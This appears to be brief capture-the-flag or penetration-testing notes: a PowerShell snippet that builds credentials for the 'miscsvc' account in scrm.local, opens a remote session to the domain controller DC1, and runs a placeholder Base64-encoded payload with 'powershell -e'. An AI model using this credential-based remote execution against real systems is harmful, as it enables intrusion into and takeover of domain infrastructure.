pwsh

ps session

$password = ConvertTo-SecureString "<miscsvc password>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("scrm.local\miscsvc", $password)
$sess = New-PSSession -Credential $cred -ComputerName DC1
Invoke-Command -Session $sess -ScriptBlock {powershell -e <Base64 encoded payload>}